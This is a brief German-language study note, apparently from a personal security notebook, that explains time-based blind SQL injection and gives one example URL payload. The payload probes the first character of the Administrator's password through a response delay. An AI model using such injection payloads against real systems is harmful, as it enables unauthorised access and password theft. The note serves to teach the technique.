# Time-Based Blind SQLi
Ähnlich wie [[20-Boolean-Based]] nur das true/false über die Zeit der Antwort des Servers ermittelt wird.

```sql
www.random.com/app.php?id\=1 and SUBSTRING((SELECT Password FROM Users WHERE Username \= 'Administrator'), 1, 1) \= 'e', sleep 10 --
```

